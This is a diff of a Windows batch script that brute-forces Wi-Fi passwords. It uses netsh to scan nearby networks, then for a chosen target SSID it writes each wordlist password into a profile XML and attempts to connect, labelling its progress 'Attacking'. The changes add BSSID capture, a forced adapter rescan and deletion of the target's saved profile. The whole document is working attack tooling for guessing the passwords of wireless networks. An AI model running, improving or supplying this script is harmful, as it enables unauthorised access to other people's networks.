@@ -27,17 +27,19 @@ if not exist importwifi.xml (
     exit
 )
 
+echo %cd%
 
 :: Interface Variables
 set interface_number=0
 set interface_mac=not_defined
 set interface_id=not_defined
+set interface_name=not_defined
 set interface_state=not_defined
 set interface_description=not_defined
 
 set wifi_target=not_defined
-
-set wordlist_file=not_defined
+set wifi_bssid=not_defined
+set wordlist_file=%cd%\wordlist\vn.txt
 
 for /f "tokens=1" %%a in ( DefaultWordlist.txt ) do (
    set wordlist_file=%%a
@@ -370,35 +372,44 @@ goto :mainmenu
     :: wifi[] is the array for possible wifis
     set wifi_index=-1
     set cancel_index=0
-    for /f "tokens=1-6" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
+    
+    :: re-scan 
+    netsh interface set interface name=%interface_id% admin=disabled
+    netsh interface set interface name=%interface_id% admin=enabled
 
+    for /f "tokens=1-20" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
+        @REM echo.
+        @REM call :color_echo . magenta "SSID: "
+        @REM call :color_echo . white "%%a"
+        @REM echo.
+        @REM call :color_echo . magenta "Signal: "
+        @REM call :color_echo . white "%%d"
+        @REM echo.
+        
         if "%%a" equ "SSID" (
             set /a wifi_index=!wifi_index!+1
             set wifi[!wifi_index!]_ssid=%%d
         )
-
+        if "%%a" equ "BSSID" (
+            set wifi[!wifi_index!]_bssid=%%d
+        )
         if "%%a" equ "Signal" (
             set wifi[!wifi_index!]_signal=%%c
         )
-
     )
     set /a cancel_index=!wifi_index!+1
     
     for /l %%a in ( 0, 1, !wifi_index! ) do (
-
         call :color_echo . magenta "%%a) "
-
         if "!wifi[%%a]_ssid!" equ "" (
             call :color_echo . red "No Name "
         ) else (
             call :color_echo . white "!wifi[%%a]_ssid! "
         )
-
-
+        call :color_echo . green "!wifi[%%a]_bssid! "
         call :color_echo . blue "!wifi[%%a]_signal!"
         echo.
     )
-
 
     call :color_echo . red "!cancel_index!) Cancel"
     echo.
@@ -413,6 +424,7 @@ goto :mainmenu
     if !program_prompt_input! leq !wifi_index! (
             if !program_prompt_input! geq 0 (
             set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
+            set "wifi_bssid=!wifi[%program_prompt_input%]_bssid!"
             goto :eof
         )
     )
@@ -470,12 +482,22 @@ goto :eof
     @REM netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
     @REM cls
 
+    cls
+        netsh wlan show drivers
+        netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
+        pause
+    cls
+
     :: Prepare ssid import
     del /Q /F importwifi_prepared.xml 2>nul
     for /f "tokens=*" %%a in ( importwifi.xml ) do (
-        set variable=%%a
-        echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
+        set variable1=%%a
+        echo !variable1:changethistitle=%wifi_target%!>>importwifi_prepared.xml
     )
+    @REM for /f "tokens=*" %%a in ( importwifi.xml ) do (
+    @REM     set variable2=%%a
+    @REM     echo !variable2:changethisbssid=%wifi_bssid%!>>importwifi_prepared.xml
+    @REM )
     set password_count=0
     for /f "tokens=1" %%a in ( !wordlist_file! ) do (
         set /a password_count=!password_count!+1
@@ -488,8 +510,14 @@ goto :eof
         call :color_echo . cyan "Attacking"
         echo.
         echo.
+        call :color_echo . magenta "Interface id   : "
+        call :color_echo . white "!interface_id!"
+        echo.
         call :color_echo . magenta "Target Wi-Fi   : "
         call :color_echo . white "!wifi_target!"
+        echo.
+        call :color_echo . magenta "Wi-Fi SSID : "
+        call :color_echo . white "!wifi_bssid!"
         echo.
         call :color_echo . magenta "Password Count : "
         call :color_echo . white "!password_count!"
@@ -501,7 +529,9 @@ goto :eof
         echo.
         call :color_echo . cyan "Attempts: "
         echo.
-		netsh wlan connect name=!wifi_target! interface="!interface_id!" >nul
+
+        @REM netsh wlan connect name=!wifi_target! ssid=!wifi_bssid! interface="!interface_id!" >nul
+        netsh wlan connect name=!wifi_target! interface="!interface_id!" >nul
 
         for /l %%a in ( 1, 1, 20 ) do (
             call :interface_find_state
@@ -609,16 +639,12 @@ goto :eof
     )
 goto :eof
 
-
-
 :prepare_attempt
 	for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
 		set code=%%x
 		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
     )
 goto :eof
-
-
 
 :interface_find_state
     set interface_state_check=false
@@ -664,8 +690,5 @@ goto :eof
         echo.
         timeout /t 2 /nobreak>nul
     )
-
-
-
 
 goto :eof
